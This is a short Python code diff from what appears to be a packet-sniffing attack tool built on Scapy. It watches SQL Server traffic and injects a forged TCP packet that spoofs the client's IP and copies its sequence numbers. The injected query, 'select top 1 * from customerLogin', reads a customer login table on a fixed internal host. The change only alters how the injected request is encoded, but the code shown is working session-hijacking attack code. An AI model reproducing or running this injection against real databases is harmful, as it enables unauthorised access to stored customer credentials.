@@ -52,7 +52,7 @@ class Parse(threading.Thread):
         elif pkt[TCP].dport == 1433:
             if len(pkt[TCP]) == 26:
                 req = sqlserver.Request()
-                send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/req.buildRequest("select top 1 * from customerLogin"))
+                send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/binascii.hexlify(req.buildRequest("select top 1 * from customerLogin")).decode('hex'))
             self.parseReqSQLServ(str(pkt[TCP]).encode('hex')[40:])
         elif pkt[TCP].dport == 3306:
             self.parseReqMySQL(str(pkt[TCP]).encode('hex')[40:])
